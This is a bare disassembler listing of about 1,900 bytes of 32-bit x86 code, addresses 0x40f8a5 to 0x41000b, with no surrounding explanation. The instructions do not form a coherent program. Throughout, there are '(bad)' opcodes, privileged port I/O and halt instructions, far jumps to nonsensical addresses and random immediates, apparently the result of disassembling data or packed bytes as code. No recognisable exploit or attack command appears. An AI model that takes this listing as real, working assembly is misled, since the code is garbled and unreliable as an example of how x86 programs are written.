  40f8a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8a6:	stc    
  40f8a7:	mov    esp,edi
  40f8a9:	loop   0x40f919
  40f8ab:	loop   0x40f8c5
  40f8ad:	into   
  40f8ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8af:	jo     0x40f849
  40f8b1:	not    DWORD PTR [eax-0x57]
  40f8b4:	fwait
  40f8b5:	xor    DWORD PTR [eax+0x24de3e87],0xffffffa6
  40f8bc:	push   esi
  40f8bd:	add    edx,DWORD PTR [eax+edx*2-0x50]
  40f8c1:	repz push ss
  40f8c3:	es jo  0x40f8c3
  40f8c6:	test   al,0xf6
  40f8c8:	xlat   BYTE PTR ds:[ebx]
  40f8c9:	mov    WORD PTR [esi+0x5e2c84a0],ss
  40f8cf:	mov    ds:0xa8b35de,eax
  40f8d4:	test   DWORD PTR [edi-0x4bbb2685],esp
  40f8da:	xchg   esp,eax
  40f8db:	sbb    eax,0xb2bff7fe
  40f8e0:	sar    BYTE PTR [eax],cl
  40f8e2:	sub    ah,ah
  40f8e4:	cmc    
  40f8e5:	pop    eax
  40f8e6:	adc    al,0x8b
  40f8e8:	addr16 adc al,0xee
  40f8eb:	fs mov bh,0x44
  40f8ee:	stos   DWORD PTR es:[edi],eax
  40f8ef:	pop    eax
  40f8f0:	mov    al,0xc0
  40f8f2:	push   ebx
  40f8f3:	hlt    
  40f8f4:	int    0x6d
  40f8f6:	dec    edi
  40f8f7:	nop
  40f8f8:	xor    DWORD PTR [esi+0x16b5fe16],ebp
  40f8fe:	xchg   edx,eax
  40f8ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f900:	push   ss
  40f901:	pop    ecx
  40f902:	xchg   edi,eax
  40f903:	jnp    0x40f95a
  40f905:	inc    edi
  40f906:	out    dx,eax
  40f907:	je     0x40f8b6
  40f909:	nop
  40f90a:	push   edx
  40f90b:	out    dx,eax
  40f90c:	and    ecx,eax
  40f90e:	jns    0x40f91b
  40f910:	dec    ecx
  40f911:	xor    al,ch
  40f913:	scas   al,BYTE PTR es:[edi]
  40f914:	xchg   edi,eax
  40f915:	ror    DWORD PTR [edx],0x81
  40f918:	fadd   QWORD PTR [esi+0x132556f6]
  40f91e:	daa    
  40f91f:	push   cs
  40f920:	mov    DWORD PTR [ecx+0x102fc71b],edx
  40f926:	into   
  40f927:	inc    ebx
  40f928:	(bad)  
  40f929:	rol    BYTE PTR [edx+0x323b59ea],1
  40f92f:	adc    ah,BYTE PTR [esi]
  40f931:	ja     0x40f8fe
  40f933:	fcmovbe st,st(1)
  40f935:	xchg   BYTE PTR [ebp+0x3e],dl
  40f938:	scas   eax,DWORD PTR es:[edi]
  40f939:	aam    0x7d
  40f93b:	push   ds
  40f93c:	enter  0xe843,0x4b
  40f940:	xchg   edi,eax
  40f941:	sbb    eax,DWORD PTR [ebp+eax*8+0x118641f1]
  40f948:	cdq    
  40f949:	mov    dh,0xe
  40f94b:	ds clc 
  40f94d:	test   DWORD PTR [edx],esi
  40f94f:	xor    al,0xc9
  40f951:	daa    
  40f952:	(bad)  
  40f953:	adc    esi,eax
  40f955:	(bad)  
  40f956:	js     0x40f9d4
  40f958:	pop    es
  40f959:	and    al,0x56
  40f95b:	pop    ebx
  40f95c:	pop    ecx
  40f95d:	(bad)  
  40f95f:	sub    eax,0x87b3b301
  40f964:	mov    eax,0x54beda7e
  40f969:	push   ecx
  40f96a:	ds mov bl,0x82
  40f96d:	inc    edi
  40f96e:	test   al,0xa9
  40f970:	mov    ds:0x8d0c225a,eax
  40f975:	(bad)  
  40f976:	fistp  QWORD PTR [edx+edi*8]
  40f979:	lahf   
  40f97a:	lds    ecx,FWORD PTR [esi-0x7f8964dd]
  40f980:	or     dh,cl
  40f982:	in     eax,dx
  40f983:	inc    edi
  40f984:	dec    edx
  40f985:	jmp    0x9ee5:0x5aa9f726
  40f98c:	jge    0x40f9e9
  40f98e:	pop    ds
  40f98f:	(bad)  
  40f990:	aad    0x56
  40f992:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f993:	outs   dx,BYTE PTR ds:[esi]
  40f994:	sbb    BYTE PTR [edx+0x10],bl
  40f997:	jg     0x40f98d
  40f999:	sbb    dl,BYTE PTR [ebx-0xaae6be4]
  40f99f:	imul   esp,ebp,0x7efc2ba8
  40f9a5:	ror    edi,0xb7
  40f9a8:	or     DWORD PTR [edi+0x78],ebp
  40f9ab:	xchg   esi,eax
  40f9ac:	xor    bl,bl
  40f9ae:	dec    esi
  40f9af:	xchg   edx,eax
  40f9b0:	xlat   BYTE PTR ds:[ebx]
  40f9b1:	push   eax
  40f9b2:	out    0x40,eax
  40f9b4:	je     0x40f964
  40f9b6:	call   FWORD PTR [ebx+0x54d9a526]
  40f9bc:	out    dx,eax
  40f9bd:	sbb    dl,0x31
  40f9c0:	mov    edi,DWORD PTR [ebp-0x44]
  40f9c3:	(bad)  [ebp+0x31]
  40f9c6:	mov    dl,bl
  40f9c8:	jl     0x40f9df
  40f9ca:	jp     0x40fa28
  40f9cc:	push   ds
  40f9cd:	pop    edx
  40f9ce:	rcr    DWORD PTR ds:0x870ff8d1,0x8e
  40f9d5:	es cwde 
  40f9d7:	sub    BYTE PTR [edi],0x97
  40f9da:	loopne 0x40f98b
  40f9dc:	or     DWORD PTR [edx+0x46],eax
  40f9df:	adc    al,0x93
  40f9e1:	cs pop ds
  40f9e3:	add    eax,DWORD PTR [ecx]
  40f9e5:	jecxz  0x40f9ef
  40f9e7:	mov    bh,0x2a
  40f9e9:	daa    
  40f9ea:	pop    eax
  40f9eb:	mov    edx,0xd4f3c778
  40f9f0:	(bad)  
  40f9f1:	mov    ebp,0xdfd23ae8
  40f9f6:	push   esi
  40f9f7:	adc    DWORD PTR [ebx],esi
  40f9f9:	pop    eax
  40f9fa:	xchg   ebx,eax
  40f9fb:	scas   al,BYTE PTR es:[edi]
  40f9fc:	lds    esi,FWORD PTR [edi]
  40f9fe:	mov    ebp,0x5ec4a08d
  40fa03:	push   edi
  40fa04:	popa   
  40fa05:	in     al,dx
  40fa06:	adc    DWORD PTR [eax],ebp
  40fa08:	repz inc esi
  40fa0a:	cmp    edx,edx
  40fa0c:	popf   
  40fa0d:	aam    0x57
  40fa0f:	cmp    ah,cl
  40fa11:	ficomp WORD PTR [eax-0x1130db8d]
  40fa17:	xchg   ebp,eax
  40fa18:	mov    bh,0x42
  40fa1a:	into   
  40fa1b:	repz mul BYTE PTR ds:0x5f526521
  40fa22:	lea    ebp,[edx+0x2977b802]
  40fa28:	(bad)  
  40fa29:	hlt    
  40fa2a:	ss mov al,0x74
  40fa2d:	addr16 jg 0x40fa93
  40fa30:	adc    bl,ah
  40fa32:	lods   al,BYTE PTR ds:[esi]
  40fa33:	xor    al,0x73
  40fa35:	push   0x52
  40fa37:	retf   
  40fa38:	ret    
  40fa39:	punpcklbw mm0,DWORD PTR [ecx-0x4eada69e]
  40fa40:	jo     0x40fa15
  40fa42:	iret   
  40fa43:	jo     0x40f9ea
  40fa45:	call   0x9495:0xbc4993c3
  40fa4c:	xchg   al,dl
  40fa4e:	fstp   TBYTE PTR [eax]
  40fa50:	aad    0xa8
  40fa52:	and    BYTE PTR [ecx+edx*8+0x3699d83f],dl
  40fa59:	push   esp
  40fa5a:	add    edi,esp
  40fa5c:	das    
  40fa5d:	std    
  40fa5e:	int3   
  40fa5f:	jmp    0xda35:0x6f322c3d
  40fa66:	cmp    ebx,0xffffffea
  40fa69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa6a:	dec    eax
  40fa6b:	jnp    0x40fa23
  40fa6d:	das    
  40fa6e:	int3   
  40fa6f:	loope  0x40faf0
  40fa71:	dec    esi
  40fa72:	sub    DWORD PTR ds:0x6ab1dc9e,ecx
  40fa78:	add    ebx,ecx
  40fa7a:	mov    eax,0x1345f91a
  40fa7f:	imul   esi,edx,0xffffffd9
  40fa82:	(bad)  
  40fa83:	out    0x3b,eax
  40fa85:	fmul   QWORD PTR [ebp-0x57]
  40fa88:	adc    esp,DWORD PTR [ebx+0x9]
  40fa8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa8c:	mov    ecx,0x7cfa1084
  40fa91:	pop    ds
  40fa92:	js     0x40fa91
  40fa94:	aaa    
  40fa95:	imul   ebx,DWORD PTR [ebx-0x46332090],0xe995e0dd
  40fa9f:	test   BYTE PTR [edi],al
  40faa1:	sbb    BYTE PTR [ebx],0x69
  40faa4:	mov    ecx,DWORD PTR [ebx]
  40faa6:	add    eax,0x93f9d6dc
  40faab:	test   eax,0x9fa7ada0
  40fab0:	jmp    0x40faff
  40fab2:	or     BYTE PTR [edx-0x62fd5816],dl
  40fab8:	loop   0x40fa97
  40faba:	jle    0x40fb1d
  40fabc:	les    ebp,FWORD PTR [ebp-0x37]
  40fabf:	jo     0x40fae3
  40fac1:	ret    
  40fac2:	jmp    0x40fa72
  40fac4:	rcr    ah,0x43
  40fac7:	int3   
  40fac8:	scas   al,BYTE PTR es:[edi]
  40fac9:	inc    eax
  40faca:	xor    DWORD PTR [edx-0x4c],eax
  40facd:	mov    bh,0x50
  40facf:	(bad)  
  40fad0:	cmp    al,0xbf
  40fad2:	pop    ebx
  40fad3:	xchg   ecx,eax
  40fad4:	stos   DWORD PTR es:[edi],eax
  40fad5:	inc    esi
  40fad6:	rol    BYTE PTR [edi-0xc8db39c],cl
  40fadc:	add    BYTE PTR [esp+edx*1-0x5a53716],0xc3
  40fae4:	add    edi,DWORD PTR [ebx]
  40fae6:	iret   
  40fae7:	aam    0x26
  40fae9:	out    0xd4,al
  40faeb:	sub    ecx,DWORD PTR [esi-0x4e]
  40faee:	and    esp,DWORD PTR [edx+eiz*2-0x4ed393c5]
  40faf5:	cpuid  
  40faf7:	loopne 0x40fa91
  40faf9:	inc    ebp
  40fafa:	mov    edi,0x62560d85
  40faff:	cdq    
  40fb00:	pop    edx
  40fb01:	call   0x67f20771
  40fb06:	cdq    
  40fb07:	test   al,0x75
  40fb09:	inc    edi
  40fb0a:	mov    esp,0x347a7653
  40fb0f:	aam    0x7f
  40fb11:	add    eax,0x30ba7aaf
  40fb16:	xchg   esp,eax
  40fb17:	rcl    BYTE PTR [edi+edx*4+0x7a],cl
  40fb1b:	push   ebp
  40fb1c:	jecxz  0x40fad7
  40fb1e:	nop
  40fb1f:	dec    ebx
  40fb20:	mov    al,BYTE PTR [edx]
  40fb22:	xor    ah,BYTE PTR [ecx]
  40fb24:	daa    
  40fb25:	clc    
  40fb26:	in     al,0x25
  40fb28:	imul   ecx,DWORD PTR [ecx+0x24],0xde190846
  40fb2f:	xor    eax,0x64e25c0f
  40fb35:	mov    BYTE PTR [ebx-0x6d093666],ch
  40fb3b:	out    dx,al
  40fb3c:	mov    ds:0xa4faf4d9,al
  40fb41:	dec    esp
  40fb42:	repz inc edi
  40fb44:	and    al,0x9e
  40fb46:	jg     0x40fb64
  40fb48:	call   0x97f6abce
  40fb4d:	popf   
  40fb4e:	outs   dx,DWORD PTR ds:[esi]
  40fb4f:	inc    esp
  40fb50:	sub    esi,ebx
  40fb52:	fisttp QWORD PTR [eax-0x281bf863]
  40fb58:	adc    BYTE PTR [edi],dl
  40fb5a:	xchg   ebp,eax
  40fb5b:	mov    esi,DWORD PTR [edi+0x11d081fa]
  40fb61:	inc    esp
  40fb62:	push   eax
  40fb63:	mov    ds:0x1ec245db,al
  40fb68:	mov    ch,0x68
  40fb6a:	add    eax,0x894a5844
  40fb6f:	sahf   
  40fb70:	pslld  mm5,QWORD PTR ss:[ebp+0x43]
  40fb75:	call   0xf1eabc06
  40fb7a:	test   eax,0x40bba810
  40fb7f:	imul   edi,edi,0x84b5cc7
  40fb85:	and    eax,eax
  40fb87:	mul    ebx
  40fb89:	stc    
  40fb8a:	and    DWORD PTR [ebx],eax
  40fb8c:	jne    0x40fb90
  40fb8e:	sub    DWORD PTR [ecx+0xf],0x78eaa8c
  40fb95:	fstp   DWORD PTR [ebx+0x7c]
  40fb98:	sbb    edi,DWORD PTR [edx+ebx*1]
  40fb9b:	lods   al,BYTE PTR ds:[esi]
  40fb9c:	mov    ecx,0x19f233c4
  40fba1:	popf   
  40fba2:	inc    ebx
  40fba3:	ss mov ch,0xa3
  40fba6:	enter  0xf2ca,0x61
  40fbaa:	sub    esi,ebx
  40fbac:	jecxz  0x40fbb2
  40fbae:	fnstsw WORD PTR [edi+0x44]
  40fbb1:	mov    al,ds:0xe2d6f49c
  40fbb6:	mov    ecx,0xef3290d2
  40fbbb:	pop    ebx
  40fbbc:	mul    BYTE PTR [ebp-0x2de1d9df]
  40fbc2:	jp     0x40fc16
  40fbc4:	jmp    0x1b22:0xd997f34d
  40fbcb:	int3   
  40fbcc:	jl     0x40fb51
  40fbce:	mov    ds:0x6c1a04a7,al
  40fbd3:	ja     0x40fc27
  40fbd5:	ss mov dl,0x3a
  40fbd8:	jnp    0x40fbd0
  40fbda:	sub    eax,0xaa326323
  40fbdf:	aad    0x35
  40fbe1:	pop    ss
  40fbe2:	sbb    al,0x85
  40fbe4:	sahf   
  40fbe5:	cmp    bl,BYTE PTR [esi+edi*1]
  40fbe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbe9:	jo     0x40fbd4
  40fbeb:	dec    ecx
  40fbec:	xchg   edi,eax
  40fbed:	sub    DWORD PTR [ecx+0x26],ebp
  40fbf0:	stos   DWORD PTR es:[edi],eax
  40fbf1:	pop    ss
  40fbf2:	(bad)  
  40fbf3:	in     al,0x1
  40fbf5:	push   cs
  40fbf6:	repz lds edx,FWORD PTR [ebp+eiz*2-0x28]
  40fbfb:	push   DWORD PTR [ecx]
  40fbfd:	fldcw  WORD PTR [edx+0x70f1665e]
  40fc03:	bound  ebp,QWORD PTR ss:[edi-0x6f]
  40fc07:	iret   
  40fc08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc09:	add    ah,dl
  40fc0b:	or     dl,BYTE PTR [ecx+eax*2-0x40138f4b]
  40fc12:	arpl   WORD PTR [esi+0x770d81f4],cx
  40fc18:	icebp  
  40fc19:	lods   al,BYTE PTR ds:[esi]
  40fc1a:	sar    esp,0xf7
  40fc1d:	aas    
  40fc1e:	fidiv  WORD PTR [ecx]
  40fc20:	dec    esp
  40fc21:	mov    bh,0x38
  40fc23:	mov    gs,eax
  40fc25:	rcr    eax,1
  40fc27:	sbb    eax,0xeb62fb10
  40fc2c:	retf   0x8279
  40fc2f:	and    eax,edx
  40fc31:	dec    ebx
  40fc32:	ret    0xc546
  40fc35:	push   edx
  40fc36:	mov    eax,ds:0x5581c349
  40fc3b:	and    edi,esp
  40fc3d:	add    ebp,edx
  40fc3f:	shl    DWORD PTR [esi+0x4cf7295c],0x33
  40fc46:	mov    eax,0xdb4e3f85
  40fc4b:	or     DWORD PTR [esi-0x53ce88f6],edx
  40fc51:	rcpps  xmm5,XMMWORD PTR [esi+0x2b78bd38]
  40fc58:	xchg   esi,eax
  40fc59:	nop
  40fc5a:	shl    DWORD PTR [ecx-0x19e95720],cl
  40fc60:	imul   edi,DWORD PTR [edi],0x3b773d6a
  40fc66:	retf   0x6d0a
  40fc69:	and    eax,edi
  40fc6b:	out    0xe0,eax
  40fc6d:	out    dx,al
  40fc6e:	cmp    al,0xfe
  40fc70:	dec    esp
  40fc71:	mov    edi,DWORD PTR [edi+ecx*1]
  40fc74:	in     eax,0xe1
  40fc76:	mov    ebx,DWORD PTR [edi-0x2c4a6964]
  40fc7c:	mov    edi,0xe6f7acde
  40fc81:	xor    eax,0xf2f5f638
  40fc86:	xchg   BYTE PTR [edx-0x5ffba554],bl
  40fc8c:	js     0x40fc5c
  40fc8e:	inc    ebp
  40fc8f:	(bad)  
  40fc90:	push   0x5fb662f5
  40fc95:	aam    0x28
  40fc97:	xor    eax,0xb18f7af0
  40fc9c:	fidiv  DWORD PTR [esi]
  40fc9e:	xlat   BYTE PTR ds:[ebx]
  40fc9f:	iret   
  40fca0:	jmp    0x44627b95
  40fca5:	inc    ebx
  40fca6:	fcmovnbe st,st(0)
  40fca8:	inc    esp
  40fca9:	setns  BYTE PTR [ecx-0x14]
  40fcad:	call   0x499d:0x96eb74a0
  40fcb4:	mov    cl,0xfc
  40fcb6:	adc    ecx,DWORD PTR [ebx-0x4ff2e404]
  40fcbc:	mov    ebp,0xe9500dc3
  40fcc1:	les    ebp,FWORD PTR [esi+0x1d30ca7e]
  40fcc7:	push   esp
  40fcc8:	push   ds
  40fcc9:	cli    
  40fcca:	sbb    DWORD PTR [ebp+edi*8+0x51],esi
  40fcce:	test   al,0x0
  40fcd0:	xlat   BYTE PTR ds:[ebx]
  40fcd1:	jb     0x40fc7d
  40fcd3:	int3   
  40fcd4:	and    BYTE PTR [esi+ecx*2],dh
  40fcd7:	int    0xab
  40fcd9:	(bad)  
  40fcda:	dec    esp
  40fcdb:	jg     0x40fc91
  40fcdd:	shl    BYTE PTR [eax],cl
  40fcdf:	jno    0x40fcc5
  40fce1:	enter  0xec2,0xf7
  40fce5:	inc    esi
  40fce6:	sbb    DWORD PTR [ecx-0x3bbedd3c],ebx
  40fcec:	loope  0x40fd2f
  40fcee:	adc    bl,BYTE PTR [eax-0x2f09d412]
  40fcf4:	cdq    
  40fcf5:	add    bl,BYTE PTR [edx+eax*1+0x690f569d]
  40fcfc:	bound  edi,QWORD PTR [ebp-0x24]
  40fcff:	adc    ecx,esp
  40fd01:	lahf   
  40fd02:	add    DWORD PTR [ecx+0x3a],ecx
  40fd05:	repz (bad)
  40fd08:	mov    ebx,0x5e9e4f1f
  40fd0d:	idiv   BYTE PTR [eax-0x75cfffb8]
  40fd13:	lds    edx,FWORD PTR [ebx+0x25]
  40fd16:	icebp  
  40fd17:	lock test DWORD PTR [ebx+0x20ebe0cf],edi
  40fd1e:	push   edi
  40fd1f:	fs sub al,0x3b
  40fd22:	mov    dh,0xd3
  40fd24:	outs   dx,BYTE PTR ds:[esi]
  40fd25:	div    DWORD PTR [ebx]
  40fd27:	idiv   DWORD PTR [eax+0x6e9719a1]
  40fd2d:	mov    ecx,0x78813b99
  40fd32:	lods   eax,DWORD PTR ds:[esi]
  40fd33:	dec    esp
  40fd34:	or     ch,dl
  40fd36:	shl    BYTE PTR [esi-0x4f],0x7c
  40fd3a:	imul   ebx,ecx,0xee14d7bd
  40fd40:	push   edx
  40fd41:	cld    
  40fd42:	addr16 (bad) 
  40fd44:	xchg   ecx,eax
  40fd45:	mov    ch,0x18
  40fd47:	or     eax,0x8e91fe69
  40fd4c:	inc    ebx
  40fd4d:	sar    dh,1
  40fd4f:	xchg   BYTE PTR [edx],al
  40fd51:	loope  0x40fda0
  40fd53:	rcl    DWORD PTR [ecx],cl
  40fd55:	gs jmp 0x9b13b89e
  40fd5b:	out    0x87,al
  40fd5d:	aad    0x26
  40fd5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd60:	(bad)  
  40fd61:	xchg   esi,eax
  40fd62:	sub    DWORD PTR [ebp+0x53b11261],0x37553f95
  40fd6c:	jmp    0xcb7cb3b7
  40fd71:	jne    0x40fd2c
  40fd73:	in     eax,0xd2
  40fd75:	fcomp  DWORD PTR [edx-0x32]
  40fd78:	imul   ebp,DWORD PTR [esi+0x7e],0x1a
  40fd7c:	jg     0x40fd84
  40fd7e:	cdq    
  40fd7f:	pop    es
  40fd80:	fisttp QWORD PTR [esi-0x131b6dd]
  40fd86:	dec    ecx
  40fd87:	fistp  QWORD PTR [edi+0x13b7de9c]
  40fd8d:	mov    al,0xf9
  40fd8f:	call   0x55e4:0xe10cc39c
  40fd96:	dec    esp
  40fd97:	push   edi
  40fd98:	out    dx,eax
  40fd99:	imul   esi,DWORD PTR [esi],0xbd9874f1
  40fd9f:	int    0x2e
  40fda1:	jne    0x40fdd6
  40fda3:	loope  0x40fe0f
  40fda5:	dec    edi
  40fda7:	into   
  40fda8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fda9:	cmc    
  40fdaa:	(bad)  
  40fdab:	jge    0x40fd81
  40fdad:	jbe    0x40fe17
  40fdaf:	push   edi
  40fdb0:	jo     0x40fd64
  40fdb2:	arpl   WORD PTR [edi-0x16],bp
  40fdb5:	popa   
  40fdb6:	mov    ebp,0x44667cc0
  40fdbb:	daa    
  40fdbc:	dec    eax
  40fdbd:	pop    esi
  40fdbe:	jb     0x40fdbb
  40fdc0:	pushf  
  40fdc1:	test   DWORD PTR [ecx+0x73],eax
  40fdc4:	fadd   DWORD PTR [ecx]
  40fdc6:	pushf  
  40fdc7:	imul   esi,ecx,0xffffff88
  40fdca:	sbb    eax,0x9cb5502a
  40fdcf:	pop    ds
  40fdd0:	(bad)  
  40fdd1:	dec    eax
  40fdd2:	sbb    eax,0x67a301f6
  40fdd7:	sub    eax,DWORD PTR ss:[edi+0x2a6b45a7]
  40fdde:	jmp    0x3a279c38
  40fde3:	cmp    BYTE PTR [ecx],dl
  40fde5:	jecxz  0x40fd84
  40fde7:	sub    dl,BYTE PTR [eax]
  40fde9:	in     eax,dx
  40fdea:	pop    ss
  40fdeb:	mov    ebx,0xaf8b4228
  40fdf0:	inc    edx
  40fdf1:	mov    esp,0x4fc3996f
  40fdf6:	push   ss
  40fdf7:	mov    ebp,0x35d93ffd
  40fdfc:	loopne 0x40fdbd
  40fdfe:	fsub   DWORD PTR [ebp-0x24ff4a1f]
  40fe04:	adc    ebx,DWORD PTR [edi+0x63c9aac5]
  40fe0a:	ss cmp BYTE PTR ss:[ebp+0x69],ch
  40fe0f:	mov    BYTE PTR [eax],cl
  40fe11:	jle    0x40fd94
  40fe13:	gs push 0xffffffdb
  40fe16:	sti    
  40fe17:	les    ecx,FWORD PTR [edx+ebp*8]
  40fe1a:	nop
  40fe1b:	sti    
  40fe1c:	nop
  40fe1d:	inc    ebx
  40fe1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe1f:	outs   dx,BYTE PTR ds:[esi]
  40fe20:	mov    ebp,0x2cefe558
  40fe25:	push   cs
  40fe26:	mov    dl,0xdf
  40fe28:	mov    ds:0x7240790d,eax
  40fe2d:	xlat   BYTE PTR ds:[ebx]
  40fe2e:	xchg   esi,eax
  40fe2f:	sub    DWORD PTR [edx-0x57],esi
  40fe32:	test   BYTE PTR [edx-0x46c31bd5],bh
  40fe38:	jno    0x40fe4e
  40fe3a:	rcl    cl,cl
  40fe3c:	fnstenv gs:[edx+0x1295532f]
  40fe43:	fadd   st,st(7)
  40fe45:	adc    ebx,DWORD PTR [esi-0x33]
  40fe48:	pop    di
  40fe4a:	pop    ecx
  40fe4b:	mov    esp,0xe8b0f682
  40fe50:	sub    dl,BYTE PTR [ebp-0x52]
  40fe53:	aaa    
  40fe54:	sub    eax,0xaf769e06
  40fe59:	ins    BYTE PTR es:[edi],dx
  40fe5a:	xchg   esi,eax
  40fe5b:	dec    edx
  40fe5c:	cmp    al,0x51
  40fe5e:	jmp    0xc5b55c2
  40fe63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe64:	fs imul ebp,ebx,0x273e53a2
  40fe6b:	idiv   DWORD PTR [ebx+0x4261efe9]
  40fe71:	mov    eax,0x362f174d
  40fe76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe77:	jno    0x40fede
  40fe79:	mov    edi,0x2aeff428
  40fe7e:	test   BYTE PTR ds:0x332591a0,cl
  40fe84:	stc    
  40fe85:	f2xm1  
  40fe87:	add    DWORD PTR [esp+0x70],ecx
  40fe8b:	sub    ebx,eax
  40fe8d:	inc    edx
  40fe8e:	out    dx,eax
  40fe8f:	sub    eax,0xbfd490cc
  40fe94:	jns    0x40fe2d
  40fe96:	mov    dh,0xa5
  40fe98:	aad    0x93
  40fe9a:	sbb    al,0x30
  40fe9c:	hlt    
  40fe9d:	add    eax,DWORD PTR [eax]
  40fe9f:	or     eax,DWORD PTR [eax+0x12]
  40fea2:	pusha  
  40fea3:	je     0x40fe37
  40fea5:	fidiv  WORD PTR [esi+0x79]
  40fea8:	mov    dh,BYTE PTR [ebx+edi*2]
  40feab:	mov    eax,cs:0x9095dc34
  40feb1:	jno    0x40fe88
  40feb3:	pop    ebx
  40feb4:	outs   dx,BYTE PTR ds:[esi]
  40feb5:	scas   al,BYTE PTR es:[edi]
  40feb6:	sub    al,ah
  40feb8:	mov    bl,BYTE PTR [eax+0x4a91d9af]
  40febe:	retf   
  40febf:	mov    esp,0x7e35e25e
  40fec4:	mov    cl,0xf
  40fec6:	rol    DWORD PTR [ebp+0x26],cl
  40fec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40feca:	fild   QWORD PTR [esi-0x7114827f]
  40fed0:	in     eax,0xe7
  40fed2:	mov    bl,0x2c
  40fed4:	jmp    0x40fe8d
  40fed6:	dec    esi
  40fed7:	mov    dh,0xed
  40fed9:	inc    edi
  40feda:	fwait
  40fedb:	test   al,0x71
  40fedd:	rcr    dl,0xbb
  40fee0:	icebp  
  40fee1:	loopne 0x40fec8
  40fee3:	fstp   QWORD PTR [ebp-0x450a41c0]
  40fee9:	in     al,dx
  40feea:	push   esp
  40feeb:	arpl   di,sp
  40feed:	jb     0x40fe9a
  40feef:	adc    eax,0x385e880e
  40fef4:	mov    ds,WORD PTR [ebp+0x5fab6171]
  40fefa:	in     al,dx
  40fefb:	sti    
  40fefc:	inc    eax
  40fefd:	ins    BYTE PTR es:[edi],dx
  40fefe:	cld    
  40feff:	push   ebp
  40ff00:	fucomi st,st(2)
  40ff02:	sub    eax,0xcf627f1d
  40ff07:	scas   al,BYTE PTR es:[edi]
  40ff08:	test   DWORD PTR [esi],esi
  40ff0a:	mov    ebx,0x598a02b2
  40ff0f:	in     al,dx
  40ff10:	sub    eax,DWORD PTR gs:0x6e730d3b
  40ff17:	mov    al,ds:0x7804f88e
  40ff1c:	ds push ebp
  40ff1e:	push   ss
  40ff1f:	(bad)  
  40ff20:	and    eax,0x2df58582
  40ff25:	lds    ecx,FWORD PTR cs:[eax-0x75c70cc7]
  40ff2c:	test   edx,edx
  40ff2e:	push   esp
  40ff2f:	pop    ss
  40ff30:	repz adc cl,ch
  40ff33:	pop    ebp
  40ff34:	lahf   
  40ff35:	jmp    0x40ff88
  40ff37:	xchg   edi,eax
  40ff38:	fwait
  40ff39:	xor    al,0x22
  40ff3b:	push   edi
  40ff3c:	and    al,0x5c
  40ff3e:	lea    edi,ds:0x158e7b0
  40ff44:	sbb    edi,DWORD PTR [ebx+0x2e6a6b7]
  40ff4a:	je     0x40fed1
  40ff4c:	and    al,0x65
  40ff4e:	xchg   esi,eax
  40ff4f:	sbb    ebx,0x768e7937
  40ff55:	rcr    DWORD PTR [ebx+0x76],cl
  40ff58:	push   ebx
  40ff59:	mov    BYTE PTR [ebp+eax*2+0x44],bh
  40ff5d:	mov    ah,0x53
  40ff5f:	add    BYTE PTR [ebx+0x61],al
  40ff62:	mov    al,ds:0x21938b95
  40ff67:	and    bl,BYTE PTR [eax]
  40ff69:	stos   DWORD PTR es:[edi],eax
  40ff6a:	retf   
  40ff6b:	daa    
  40ff6c:	mov    bl,0xc5
  40ff6e:	jb     0x40ffa7
  40ff70:	fisubr WORD PTR [eax]
  40ff72:	ss iret 
  40ff74:	(bad)  
  40ff75:	das    
  40ff76:	cmc    
  40ff77:	mov    ebp,DWORD PTR [edx+0x632b9541]
  40ff7d:	leave  
  40ff7e:	add    dl,BYTE PTR [eax]
  40ff80:	pop    es
  40ff81:	(bad)  
  40ff82:	mov    ds:0x91265398,al
  40ff87:	and    eax,0x8aa1d77e
  40ff8c:	ss stos DWORD PTR es:[edi],eax
  40ff8e:	stos   DWORD PTR es:[edi],eax
  40ff8f:	(bad)  
  40ff90:	mov    edx,0x6b92744c
  40ff95:	call   0x30c6acb3
  40ff9a:	retf   
  40ff9b:	fld    st(2)
  40ff9d:	lock xor al,BYTE PTR es:[esi-0x1675b24f]
  40ffa5:	(bad)  
  40ffa6:	clc    
  40ffa7:	adc    eax,0xfd3e61cb
  40ffac:	jae    0x40ffd3
  40ffae:	leave  
  40ffaf:	cmp    BYTE PTR [eax-0x79],0x1b
  40ffb3:	cld    
  40ffb4:	arpl   WORD PTR [ebx-0x3b6471d4],bx
  40ffba:	add    al,0x9b
  40ffbc:	shr    bh,1
  40ffbe:	dec    eax
  40ffbf:	mov    ?,WORD PTR [esi]
  40ffc1:	sub    eax,0x92e5d6ff
  40ffc6:	or     bh,BYTE PTR [ebx-0x4e]
  40ffc9:	leave  
  40ffca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffcb:	dec    edi
  40ffcc:	jp     0x40ffa0
  40ffce:	jno    0x40ff5a
  40ffd0:	cmp    DWORD PTR ds:0x75030cd5,0xffffffbc
  40ffd7:	xor    al,0xc1
  40ffd9:	lock cmp dl,BYTE PTR [edx]
  40ffdc:	jb     0x40ffab
  40ffde:	sub    BYTE PTR [ecx],ah
  40ffe0:	inc    edi
  40ffe1:	xor    eax,0x12fc444b
  40ffe6:	outs   dx,DWORD PTR ds:[esi]
  40ffe7:	push   ebp
  40ffe8:	in     al,0xdd
  40ffea:	loope  0x40ff8a
  40ffec:	pop    edi
  40ffed:	push   ebp
  40ffee:	or     edi,DWORD PTR [edx+0x16445a33]
  40fff4:	and    eax,0x405879a0
  40fff9:	jb     0x40ffe8
  40fffb:	push   eax
  40fffc:	(bad)  
  40fffd:	(bad)  
  40fffe:	repz adc esp,esi
  410001:	gs test dl,dh
  410004:	pop    es
  410005:	xor    esi,ebx
  410007:	inc    edx
  410008:	and    BYTE PTR [edx],ah
  41000a:	inc    ecx
  41000b:	sbb    DWORD PTR [ebp+0x23],0xfffffff7
